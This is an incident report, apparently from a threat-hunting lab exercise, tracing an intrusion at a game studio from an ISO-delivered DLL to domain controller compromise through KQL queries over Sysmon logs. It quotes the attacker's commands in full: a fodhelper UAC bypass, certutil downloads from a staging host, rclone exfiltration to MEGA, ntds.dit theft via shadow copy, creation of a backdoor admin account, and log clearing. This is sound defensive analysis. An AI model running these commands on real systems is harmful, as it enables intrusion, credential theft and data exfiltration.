# Security Incident Report

## Executive Summary

**Incident ID:** `INC-2026-0130-EMBERFORGE`  
**Incident Severity:** `High`  
**Incident Status:** `Investigation Completed`

### Incident Overview

On `2026-01-30`, EmberForge Studios experienced a multi-stage intrusion that began on an artist workstation and progressed to a server and Domain Controller. Available telemetry shows that the attacker gained execution on `EC2AMAZ-B9GHHO6.emberforge.local` after user `lmartin` extracted a downloaded archive, mounted `EmberForge_Review.iso`, and triggered execution of `D:\review.dll` through `rundll32.exe`.

From there, the attacker established a follow-on payload in `C:\Users\Public\update.exe`, used a `fodhelper.exe` registry hijack to bypass UAC, dumped LSASS credentials, injected into `spoolsv.exe` running as `NT AUTHORITY\SYSTEM`, and moved laterally to `EC2AMAZ-16V3AU4.emberforge.local`. On the server, the attacker staged tooling from `sync[.]cloud-endpoint[.]net`, configured `AnyDesk`, compressed `C:\GameDev` into `C:\Users\Public\gamedev.zip`, and exfiltrated the archive to MEGA using `rclone.exe`.

The intrusion also extended to the Domain Controller, `EC2AMAZ-EEU3IA2.emberforge.local`, where the attacker used `vssadmin.exe` to create a shadow copy, copied `ntds.dit`, created a backdoor account named `svc_backup`, added that account to `Domain Admins`, created scheduled task persistence, and cleared event logs with `wevtutil.exe`.

### Key Findings

- The earliest confirmed malicious execution occurred on `EC2AMAZ-B9GHHO6.emberforge.local` after `EmberForge_Review.iso` was extracted and mounted.
- The first clearly malicious payload observed was `D:\review.dll`, executed through `rundll32.exe`.
- The attacker deployed `C:\Users\Public\update.exe` as the primary follow-on payload.
- Local privilege escalation was achieved through a `fodhelper.exe` UAC bypass using the `ms-settings` registry hijack and the `DelegateExecute` value.
- The attacker created `C:\Windows\System32\lsass.dmp`, indicating credential access on the workstation.
- The attacker moved laterally from the workstation to the server by copying `update.exe` over the `C$` administrative share.
- `C:\GameDev` on the server was compressed with `Compress-Archive` and staged as `C:\Users\Public\gamedev.zip`.
- The archive was exfiltrated to MEGA using `rclone.exe`.
- The Domain Controller was compromised, and `ntds.dit` was copied from a Volume Shadow Copy.
- The attacker established domain persistence by creating `svc_backup`, adding it to `Domain Admins`, and creating a scheduled task named `WindowsUpdate`.

### Immediate Actions

Because this investigation was performed as a retrospective hunt, the telemetry does not show the defenders’ actual response actions. Based on the observed attacker activity, the following immediate actions would be appropriate:

- Isolate `EC2AMAZ-B9GHHO6.emberforge.local`, `EC2AMAZ-16V3AU4.emberforge.local`, and `EC2AMAZ-EEU3IA2.emberforge.local` from the network.
- Disable and remove `svc_backup`, remove it from `Domain Admins`, and review all recent privileged group membership changes.
- Reset passwords for all privileged accounts, service accounts, local administrator accounts, and any accounts with active or recent logons to the affected systems during the intrusion window.
- Treat the copy of `ntds.dit` as a likely broad identity compromise and begin full credential hygiene for the domain.
- Reset the `krbtgt` account twice, allowing replication to complete between resets and waiting at least 10 hours, or longer than the environment’s Kerberos ticket lifetime, before performing the second reset.
- Invalidate active Kerberos tickets and review authentication artifacts tied to compromised or newly created accounts.
- Remove the scheduled task `WindowsUpdate`, review other scheduled tasks created during the intrusion window, and hunt for additional persistence.
- Remove unauthorized remote access tooling, including `AnyDesk`, and review associated services, configuration files, and startup entries.
- Block or alert on communication to `sync[.]cloud-endpoint[.]net`, `cdn[.]cloud-endpoint[.]net`, `bt5[.]api[.]mega[.]co[.]nz`, and `66[.]203[.]125[.]15`.
- Review and rotate any secrets, API keys, or service credentials accessible from `C:\GameDev`, the affected workstation, the server, or the Domain Controller.
- Preserve relevant logs, EDR telemetry, and forensic artifacts before cleanup actions remove additional evidence.

### Stakeholder Impact

**Engineering and Product Teams:**  
The attacker accessed and archived `C:\GameDev` on the server, which strongly suggests exposure of unreleased development material and source code. This is the highest-confidence business impact observed in the reviewed telemetry.

**IT and Security Teams:**  
The compromise extended from a workstation to a server and Domain Controller, which means this wasn't a single-host incident. The attacker obtained privileged execution, accessed credential material, and established persistence.

**Employees:**  
The Domain Controller was compromised and `ntds.dit` was copied from a shadow copy. That creates risk for broad credential exposure across domain users and service accounts.

**Leadership and Legal Stakeholders:**  
The opening brief stated that unreleased source code was on the dark web. While the reviewed telemetry doesn't independently prove publication, it does strongly support theft of source code and compromise of domain credential material.

---

## Technical Analysis

### Affected Systems & Data

The reviewed telemetry shows confirmed attacker activity on the following systems:

- `EC2AMAZ-B9GHHO6.emberforge.local`,(`10.1.173.145`) the initial workstation
- `EC2AMAZ-16V3AU4.emberforge.local` (`10.1.57.66`), the server used for staging and exfiltration
- `EC2AMAZ-EEU3IA2.emberforge.local` (`10.1.160.76`), the Domain Controller

The most important data exposures supported by the evidence are:

- `C:\GameDev` on the server, which was compressed and uploaded to MEGA
- `C:\Windows\System32\lsass.dmp` on the workstation, indicating credential material from LSASS
- `ntds.dit` on the Domain Controller, copied from a Volume Shadow Copy into `C:\Windows\Temp\nyMdRNSp.tmp`

## Evidence Sources & Analysis

### 1. Initial Access and First Malicious Execution

The opening brief indicated that Lisa Martin observed unusual behavior after opening content from her desktop. To test that lead, process creation events for `user_s == "lmartin"` were reviewed first.

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == 1 and user_s == "lmartin" 
| project UtcTime_s, ParentImage_s, ParentCommandLine_s, Image_s, CommandLine_s
| sort by UtcTime_s asc
```

That query showed `7zG.exe` running at `2026-01-30 21:24:04.656` on `EC2AMAZ-B9GHHO6.emberforge.local`:

```text
"C:\Program Files\7-Zip\7zG.exe" x -o"C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\" -spe -an -ai#7zMap13315:120:7zEvent17197
```

To confirm what was extracted, file creation events were pivoted into the same destination path.

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == 11 and TargetFilename_s has @"C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\"
| project UtcTime_s, Computer, Image_s, TargetFilename_s
```

That showed `EmberForge_Review.iso` being created at `2026-01-30 21:24:10.848`:

```text
C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\EmberForge_Review.iso
```

From there, the next logical pivot was the DLL name that appeared in follow-on activity.

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == 1
| search "review.dll"
| project UtcTime_s, Computer, ParentImage_s, ParentCommandLine_s, Image_s, CommandLine_s
| sort by UtcTime_s asc 
```

At `2026-01-30 21:27:03.300`, `explorer.exe` launched `rundll32.exe` to execute the DLL from the mounted `D:` volume:

```text
"C:\Windows\System32\rundll32.exe" D:\review.dll,StartW
```

That is the earliest confirmed malicious execution in the reviewed telemetry.  

<img width="1318" height="545" alt="Q10_01_7z_extraction" src="https://github.com/user-attachments/assets/3532b085-382e-4201-88a1-a81e329fe7a4" />  

<img width="1435" height="412" alt="Q10_02_identifying_file_extracted_by_7z" src="https://github.com/user-attachments/assets/b5dcb471-d7cb-4890-ae8d-0267777e55c9" />  

> Identifying the extracted file (.iso)

<img width="1679" height="607" alt="Q10_04_what_review_dll_is_doing" src="https://github.com/user-attachments/assets/f33a02fa-a764-4721-9ba3-de9d523e5a40" />  

> DLL execution

### 2. Follow-on Payload Deployment and Early Injection

Once `review.dll` executed, the next question was what persistent payload the attacker add on to the host.

To identify newly created files after the DLL execution window, file creation events on the workstation were reviewed.

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:03.300) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == 11
| where Computer == "EC2AMAZ-B9GHHO6.emberforge.local"
| project UtcTime_s, Computer, Image_s, TargetFilename_s
| sort by todatetime(UtcTime_s) asc
```

That query showed a new executable appearing in a world-writable location. At `2026-01-30 21:36:34.586`, `C:\Users\Public\update.exe` was created on `EC2AMAZ-B9GHHO6.emberforge.local`.

To understand how the attacker began hiding execution, `CreateRemoteThread` events were reviewed.

```kusto
EmberForgeX_CL 
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:03.300) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == 8
| project UtcTime_s, Computer, SourceImage_s, TargetImage_s
| sort by UtcTime_s asc
```

At `2026-01-30 21:32:42.708`, the first observed injection chain was:

```text
rundll32.exe > notepad.exe
```

This helped establish that the attacker wasn't staying within the original DLL execution path and was already moving into alternate processes.

<img width="1281" height="481" alt="Q15_Dropper_payload_update_in_public_after_dll_run" src="https://github.com/user-attachments/assets/9f632651-c7a7-4469-bf4e-58b6709e0c29" />  

> update.exe added to C:\Users\Public

<img width="1384" height="324" alt="Q18_create_remote_thread_rundll_notepad0" src="https://github.com/user-attachments/assets/f651dffc-f244-4111-bec3-6b63df143132" />

> Initial process injection into notepad.exe

### 3. UAC Bypass and Local Privilege Escalation

After identifying `update.exe`, the next step was to determine how it was elevated. Process and registry events on the workstation showed a familiar UAC bypass pattern involving `fodhelper.exe`.

```kusto
EmberForgeX_CL 
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:03.300) .. datetime(2026-01-31 00:00:00)) 
| where EventCode_s has_any (1,13) and Computer == "EC2AMAZ-B9GHHO6.emberforge.local"
| project UtcTime_s, EventCode_s, Image_s, CommandLine_s, Details_s, TargetObject_s
| sort by UtcTime_s asc
```

At `2026-01-30 21:38:33.686`, `reg.exe` set the default execution path for the `ms-settings` shell handler:

```text
reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /t REG_SZ /d C:\Users\Public\update.exe /f
```

At `2026-01-30 21:38:50.829`, `reg.exe` then created the enabling value:

```text
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f
```

The next important process event followed at `2026-01-30 21:39:02.511`:

```text
fodhelper.exe
```

This sequence is consistent with the `fodhelper.exe` UAC bypass. The value that enabled the hijack was:

```text
DelegateExecute
```

<img width="1690" height="614" alt="Q19_UAC_Bypass_fodhelper" src="https://github.com/user-attachments/assets/b1385c33-7b00-4cd7-b72f-d0b43d07ce32" />  

> fodhelper UAC bypass via ms-settings hijack

### 4. Beaconing, Credential Access, and Discovery

With a resident payload running at higher privilege, the next questions were whether it beaconed externally, whether it accessed credentials, and what information it gathered from the environment.

#### 4.1 Beacon Infrastructure

To identify external communication associated with `update.exe`, DNS query events were reviewed.

```kusto
EmberForgeX_CL | where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:03.300) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == 22 and Image_s == @"C:\Users\Public\update.exe"
| project UtcTime_s, Computer, QueryName_s, QueryResults_s
| sort by UtcTime_s asc
```

From `2026-01-30 21:40:24.206` through `2026-01-30 23:07:39.469`, `C:\Users\Public\update.exe` queried:

```text
cdn[.]cloud-endpoint[.]net
```

The query results included:

```text
172[.]67[.]174[.]46
104[.]21[.]30[.]237
```

<img width="1154" height="373" alt="Q17_dns_ip_resolution_c2" src="https://github.com/user-attachments/assets/d4dec2a9-68a7-4f60-814f-f2fd23678579" />  

> DNS activity associated with update.exe

#### 4.2 Credential Access

To identify dump artifacts, file creation events were filtered for `.dmp` output.

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:03.300) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == 11 and TargetFilename_s endswith ".dmp"
| project UtcTime_s, Computer, Image_s, TargetFilename_s
| sort by UtcTime_s asc
```

At `2026-01-30 21:48:13.892` on `EC2AMAZ-B9GHHO6.emberforge.local`, `C:\Users\Public\Update.exe` created:

```text
C:\Windows\System32\lsass.dmp
```

> [!NOTE]
> This supports the assessment that credentials were likely dumped from LSASS despite the absence of ProcessAccess events (Sysmon Event ID 10), which may indicate the dumping tool used direct syscalls to reduce API-monitoring visibility.

<img width="1124" height="327" alt="Q22_credential_dumping" src="https://github.com/user-attachments/assets/79fb508f-77dd-42a3-8bb9-bd7b8bdcb2a7" />  
> LSASS dump creation

#### 4.3 Discovery

To see what the attacker enumerated after gaining execution, process creation events were filtered to common Living Off the Land (LOTL) binaries.

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:03.300) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == 1 and Image_s has_any ("whoami","hostname","net","systeminfo","nltest")
| project UtcTime_s, Computer, Image_s, CommandLine_s
| sort by UtcTime_s asc
```

From `2026-01-30 21:33:59.687` through `2026-01-30 21:41:43.162`, the attacker ran the following on `EC2AMAZ-B9GHHO6.emberforge.local`:

```text
hostname
net user /domain
net group "Domain Admins" /domain
nltest /dclist:emberforge.local
whoami /priv
```

This shows the attacker confirming the current host, reviewing privilege, enumerating domain accounts and privileged groups, and identifying domain controllers. Additionally, the search
revealed similar commands executed on server, `EC2AMAZ-16V3AU4` at `2026-01-30 22:08:18.836`.

<img width="1604" height="605" alt="q24-26_initial_discovery_recon_and_potential_time_of_lateral_movement" src="https://github.com/user-attachments/assets/e4561df2-4a7e-4546-a416-ce061db1b322" />  

> Workstation reconnaissance activity and potential first commands after lateral movement.

### 5. SYSTEM-Level Injection and Transition to Lateral Movement

The next useful pivot was to understand how the attacker moved from a user-context payload into a more stable and privileged process.

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:03.300) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == 8
| project UtcTime_s, Computer, SourceImage_s, SourceProcessId_s, TargetImage_s, TargetProcessId_s, TargetUser_s
| sort by UtcTime_s asc
```

At `2026-01-30 21:56:44.706`, the payload created a remote thread in a different process running as `NT AUTHORITY\SYSTEM`:

```text
update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)
```

This was a significant transition point. After this event, `spoolsv.exe` became the parent for multiple high-value actions tied to remote administration, tool transfer, and server targeting.  

<img width="1546" height="436" alt="Q21_second_proc_injection_from_elelevated_beacon_update" src="https://github.com/user-attachments/assets/0d57d3d4-ada7-4f80-ac47-41f2c2dbc125" />  

> Elevated process spoolsv.exe, PID 2340

### 6. Workstation-Based Spread and Remote Access Preparation

Once `spoolsv.exe` became the attacker’s execution parent, the next step was to inspect its child processes.

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:03.300) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == 1 and ParentImage_s contains "spoolsv.exe" and ParentProcessId_s == 2340
| project UtcTime_s, Computer, ParentImage_s, ParentProcessId_s, Image_s, ProcessID_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

That query showed a high-signal sequence of events on `EC2AMAZ-B9GHHO6.emberforge.local`.

At `2026-01-30 22:14:55.324`, the attacker copied the payload to the server:

```text
cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe
```

The same parent-child relationship also showed installation and configuration of `AnyDesk`, including:

```text
cmd.exe /c C:\Users\Public\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
cmd.exe /c type C:\ProgramData\AnyDesk\system.conf
cmd.exe /c "echo ad.security.interactive_access=2 >> C:\ProgramData\AnyDesk\system.conf"
cmd.exe /c "echo ad.security.unattended_access_password_hash=5e884898da28047d91089d3f7c6e12d05d0fb9e2 >> C:\ProgramData\AnyDesk\system.conf"
cmd.exe /c "net stop AnyDesk"
cmd.exe /c "net start AnyDesk"
```

This suggests the attacker dropped the remote monitoring and management (RMM) tool, but that the AnyDesk services was stopped then started.  

The same host also showed preparation for broader movement:

At `2026-01-30 22:51:36.903`:

```text
net share tools=C:\Users\Public /grant:everyone,full
```

At `2026-01-30 22:54:09.948`:

```text
netsh advfirewall firewall add rule name=\"SMB\" dir=in action=allow protocol=tcp localport=445
```

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:03.300) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == 1 and Image_s contains "netsh"
| project UtcTime_s, Computer, Image_s, CommandLine_s
| sort by UtcTime_s asc
```

These changes support a broader lateral movement and staging workflow.

<img width="1732" height="509" alt="Q29_processes_initated_by_update_after_elevating_to_system" src="https://github.com/user-attachments/assets/69150331-fb90-4d56-80b1-9852f4cf9f92" />  

> Lateral transfer of `update.exe` to the server


<img width="1501" height="248" alt="Q27_share_added_tool_staging" src="https://github.com/user-attachments/assets/80daa332-bca0-42a8-bc52-da105a810830" />  

>The `tools` share being created

<img width="1163" height="458" alt="Q28_firewall_rule_added" src="https://github.com/user-attachments/assets/cb75194e-a9e9-4e32-a750-a3e226f22829" />  

> SMB firewall rule creation


<img width="1748" height="509" alt="AnyDesk_Conf_settings" src="https://github.com/user-attachments/assets/fd397f5b-58ba-4b29-9038-d86d2da54f19" />  

> AnyDesk installation and configuration


### 7. Server Compromise, Tool Staging, and Service-Based Remote Execution

After confirming that `update.exe` was copied to the server, the next step was to understand how the attacker executed there and whether they used additional delivery methods.

To identify download and transfer utilities across the environment:

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == 1 and CommandLine_s has_any ("curl","certutil","wget","iwr","invoke-web","invoke-expression","iex")
| project UtcTime_s, Computer, ParentImage_s, Image_s, CommandLine_s
| sort by UtcTime_s asc
```

At `2026-01-30 22:10:52.789` on `EC2AMAZ-16V3AU4.emberforge.local`, the attacker used `certutil.exe` to download `AnyDesk.exe`:

```text
certutil -urlcache -split -f hxxp://sync[.]cloud-endpoint[.]net:8080/AnyDesk.exe C:\Users\Public\AnyDesk.exe
```

Other server-side activity showed both PowerShell `IWR` and `certutil.exe` being used to retrieve `update.exe` from the same staging infrastructure.

To understand how the attacker was executing commands on the server, service installation events were reviewed:

```kusto
EmberForgeX_CL
| where EventCode_s == 7045
| where Computer == "EC2AMAZ-16V3AU4.emberforge.local"
| project SystemTime_s, Computer, ServiceName_s, service_path_s
| sort by SystemTime_s asc
```

That query revealed several randomly named services, typical of some remote access tools, as well as the `AnyDesk Service`.

The associated service paths used by the randomly named services used `%COMSPEC%`, temporary batch files, and redirected output to `\\%COMPUTERNAME%\C$\__output_*`, which is consistent with service-based remote execution.  

<img width="1381" height="557" alt="service_installation_events" src="https://github.com/user-attachments/assets/9dc2bea4-cf9b-4ec0-9603-7e2f20daf261" />  

> Temporary services used for remote execution and Any Desk Service

<img width="1685" height="529" alt="Q9_Staging_Server_identified" src="https://github.com/user-attachments/assets/d9017b47-7bc8-4935-a1ad-59fe997fc393" />  

>  Tool staging on the server


### 8. Collection and Archive Creation on the Server

Once the server was fully compromised, the next question was what data did the attacker target before exfiltration?

To locate compression and archiving activity, process creation was filtered to common archive extensions.

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == 1 and CommandLine_s has_any (".zip", ".7z", ".rar", ".tar", ".gz") 
| project UtcTime_s, Computer, Image_s, CommandLine_s
```

At `2026-01-30 23:11:28.112` on `EC2AMAZ-16V3AU4.emberforge.local`, PowerShell ran:

```text
powershell.exe -c "Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip"
```

This is important because it shows both the input and output directly:

- Source directory: `C:\GameDev`
- Archive output: `C:\Users\Public\gamedev.zip`



<img width="1669" height="516" alt="Q1_file_path_of_stolen_data" src="https://github.com/user-attachments/assets/ffd97d79-2f53-4ed9-ab21-7ecba73f11b1" />  

> Compression of the GameDev directory



### 9. Exfiltration to MEGA

After confirming the archive path, the next pivot was into the exfiltration tool and the network connection that supported it.

`rclone.exe` execution was revealed from the previous KQL query for process creation events to identify zip file extensions in the commandline.  

Explicitly searching for process creation events for `rclone.exe`:

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == 1 and CommandLine_s contains ("rclone.exe")
| project UtcTime_s, Computer, Image_s, CommandLine_s
```

At `2026-01-30 23:08:28.665`, the attacker ran:

```text
C:\Users\Public\rclone.exe copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton[.]me --mega-pass Summer2024! -v
```

This execution exposed the cloud username and plaintext password directly in the command line.

At `2026-01-30 23:11:44.379`, a later `rclone.exe` execution used the staged archive:

```text
C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\Users\Public\gamedev.zip mega:exfil -v
```

To tie that process to network activity, outbound connections for `rclone.exe` were reviewed.

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == 3 
| where Image_s contains "rclone.exe"
| project UtcTime_s, Computer, Image_s, DestinationHostname_s, DestinationIp_s
```

At `2026-01-30 23:12:53.154`, `C:\Users\Public\rclone.exe` connected to:

```text
Destination host: bt5[.]api[.]mega[.]co[.]nz
Destination IP:   66[.]203[.]125[.]15
```

Taken together, these events support exfiltration of `gamedev.zip` to MEGA from the server.  

<img width="1672" height="493" alt="Q2_Exfil_Destination_Cloud_Service" src="https://github.com/user-attachments/assets/00dd412d-eb8e-4659-81e7-3b684c55d479" />  

<img width="1658" height="643" alt="Q3_Attacker_Attribution_email_address" src="https://github.com/user-attachments/assets/47e3d2a6-f03b-4fdb-9ee8-6d279f46cd6e" />  

> Attacker credentials exposed in `rclone.exe` commandline

<img width="1388" height="521" alt="Q6_Exfil_Destination_ip" src="https://github.com/user-attachments/assets/ba2b7eaf-ddd7-4149-b9a0-0a3e9104676e" />  

> Network evidence of `rclone.exe` and MEGA


### 10. Domain Controller Compromise and `ntds.dit` Extraction

The next major shift in scope came from activity on the Domain Controller. To understand what happened there, process creation was reviewed for `EC2AMAZ-EEU3IA2`.

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:03.300) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == 1 and Computer contains "EC2AMAZ-EEU3IA2"
| where Image_s !contains "splunk"
| project UtcTime_s, ParentImage_s, ParentCommandLine_s, Image_s, CommandLine_s
| sort by UtcTime_s asc
```

The first observed command on the Domain Controller was `whoami` at `2026-01-30 23:19:21.118`, which is a common first step once an attacker lands on a new host.

The next pivot focused on shadow-copy and credential-database activity.

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where Computer == "EC2AMAZ-EEU3IA2.emberforge.local"
| where EventCode_s == 1
| where CommandLine_s has_any ("ntds.dit", "vssadmin", "shadowcopy", "diskshadow", "esentutl", "Windows\\NTDS", "System32\\config\\SYSTEM")
| project UtcTime_s, Computer, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

That query showed the full sequence used to access `ntds.dit`:

At `2026-01-30 23:34:56.069`:

```text
vssadmin list shadows /for=C:
```

At `2026-01-30 23:35:04.575`:

```text
vssadmin create shadow /For=C:
```

At `2026-01-30 23:35:06.628`:

```text
vssadmin list shadows /for=C:
```

At `2026-01-30 23:35:15.307`:

```text
C:\Windows\system32\cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\nyMdRNSp.tmp
```

At `2026-01-30 23:35:17.505`:

```text
vssadmin delete shadows /shadow="{0ed56514-fe1b-4ef9-a2b1-d468122c1920}" /Quiet
```

That sequence is strong evidence for deliberate shadow-copy abuse to access the locked Active Directory database.

<img width="1715" height="435" alt="dc_shadowcopy_ntds_extraction" src="https://github.com/user-attachments/assets/93831746-cb29-4c0b-b601-6be0388326f6" />  

>  Shadow-copy abuse and ntds.dit extraction



### 11. Domain Persistence, Privilege Escalation, and Evidence Removal

Once the Domain Controller was compromised, the attacker moved into persistence, privilege escalation, and evidence deletion.

To isolate the backdoor account creation and group modification:

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 23:30:00) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == 1
| where Computer == "EC2AMAZ-EEU3IA2.emberforge.local"
| where CommandLine_s has_any ("svc_backup", "Domain Admins")
| project UtcTime_s, Computer, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

At `2026-01-30 23:38:11.819`, the attacker created:

```text
net user svc_backup P@ssw0rd123! /add /domain
```

At `2026-01-30 23:39:37.986`, the attacker elevated the account:

```text
net group "Domain Admins" svc_backup /add /domain
```

The next relevant pivot showed share-access credentials passed in plaintext:

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 23:40:00) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == 1
| where Computer == "EC2AMAZ-EEU3IA2.emberforge.local"
| where CommandLine_s has "net use Z:"
| project UtcTime_s, Computer, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

At `2026-01-30 23:45:25.132`:

```text
net use Z: \\10.1.173.145\tools /user:EMBERFORGE\Administrator EmberForge2024!
```

The attacker also established task-based persistence:

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 23:40:00) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == 1
| where Computer == "EC2AMAZ-EEU3IA2.emberforge.local"
| where CommandLine_s has "schtasks"
| project UtcTime_s, Computer, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

At `2026-01-30 23:47:38.302`:

```text
schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\update.exe" /sc onstart /ru system
```

Finally, the attacker cleared logs with `wevtutil.exe`:

```kusto
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 23:45:00) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == 1
| where Computer == "EC2AMAZ-EEU3IA2.emberforge.local"
| where CommandLine_s has "wevtutil cl"
| project UtcTime_s, Computer, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc
```

Observed commands included:

```text
wevtutil cl Security
wevtutil cl System
```

This shows not only domain persistence and privilege expansion, but also clear evidence of defense evasion.  

<img width="1700" height="470" alt="backdoor_account_creation" src="https://github.com/user-attachments/assets/2762b6a5-1e88-429d-ada2-5b03ec8e8bb5" />  

> Backdoor account creation and Domain Admins membership

<img width="1590" height="513" alt="share_access_with_credentials" src="https://github.com/user-attachments/assets/a9b36b38-d221-4732-be18-3b0f8aaae746" />  

> Share access with plaintext credentials

<img width="1653" height="561" alt="scheduled_task_persistence_via_service" src="https://github.com/user-attachments/assets/3697ae36-2a6d-4d89-9d41-74a6eb18f408" />  

> Scheduled task `WindowsUpate` persistence on the Domain Controller

<img width="999" height="613" alt="security_system_log_cleared" src="https://github.com/user-attachments/assets/006ef1a4-ccb8-4ae1-8cda-91b0d6ad0a5d" />  

> Event log clearing

## Indicators of Compromise (IoCs)

| Type | Indicator | Context |
|---|---|---|
| Host | `EC2AMAZ-B9GHHO6.emberforge.local` | Initial workstation compromise |
| Host | `EC2AMAZ-16V3AU4.emberforge.local` | Server used for collection and exfiltration |
| Host | `EC2AMAZ-EEU3IA2.emberforge.local` | Domain Controller compromise |
| File | `EmberForge_Review.iso` | Delivery container |
| File | `D:\review.dll` | Initial malicious DLL execution |
| File | `C:\Users\Public\update.exe` | Follow-on payload |
| File | `C:\Windows\System32\lsass.dmp` | LSASS dump |
| File | `C:\Users\Public\gamedev.zip` | Exfiltration archive |
| File | `C:\Windows\Temp\nyMdRNSp.tmp` | Temporary copy of `ntds.dit` |
| Domain | `sync[.]cloud-endpoint[.]net` | Tool staging infrastructure |
| Domain | `cdn[.]cloud-endpoint[.]net` | Beacon or C2 infrastructure |
| Domain | `bt5[.]api[.]mega[.]co[.]nz` | Exfiltration destination |
| IP | `172[.]67[.]174[.]46` | Resolved IP for `cdn[.]cloud-endpoint[.]net` |
| IP | `104[.]21[.]30[.]237` | Resolved IP for `cdn[.]cloud-endpoint[.]net` |
| IP | `66[.]203[.]125[.]15` | Observed MEGA destination IP |
| Email / Account | `jwilson.vhr@proton[.]me` | MEGA username |
| Account | `svc_backup` | Backdoor domain account |
| Process | `rclone.exe` | Exfiltration utility |
| Process | `fodhelper.exe` | UAC bypass trigger |
| Process | `vssadmin.exe` | Shadow-copy abuse |
| Tool | `AnyDesk.exe` | Remote access tool |
| Registry | `HKCU\Software\Classes\ms-settings\shell\open\command` | UAC bypass path |
| Registry Value | `DelegateExecute` | UAC bypass enabler |
| Task | `WindowsUpdate` | Scheduled task persistence |
| Service Name | `MzLblBFm` | Temporary service used for remote execution |
| Service Name | `QjhJMWqS` | Temporary service used for remote execution |
| Service Name | `pGJLIKnC` | Temporary service used for remote execution |

## Root Cause Analysis

The immediate root cause supported by the reviewed telemetry was user execution of content that led to extraction of `EmberForge_Review.iso`, mounting of that ISO, and execution of `D:\review.dll` via `rundll32.exe` on `EC2AMAZ-B9GHHO6.emberforge.local`.

Several control gaps appear to have enabled the intrusion to progress:

- The attacker was able to execute content from a mounted ISO without being stopped before payload execution.
- A world-writable path, `C:\Users\Public\`, was used repeatedly for staging and execution of tooling.
- UAC bypass through the `ms-settings` registry hijack succeeded, which suggests insufficient prevention or detection around that behavior.
- The attacker used both legitimate tooling and built-in utilities, including `Compress-Archive`, `certutil.exe`, `vssadmin.exe`, `net.exe`, `netsh.exe`, `wevtutil.exe`, and `schtasks.exe`, which reduced the need for obviously malicious binaries.
- The attacker was able to move laterally using SMB shares and later access the Domain Controller, which suggests that segmentation or privilege boundaries were not sufficient to contain the compromise after the initial foothold.

The full delivery path before the archive extraction wasn't fully reconstructed from the reviewed notes, so I don't want to overclaim a confirmed phishing chain or exact pre-execution origin. That said, the workstation execution chain itself is strongly supported by the available telemetry.

## Nature of the Attack

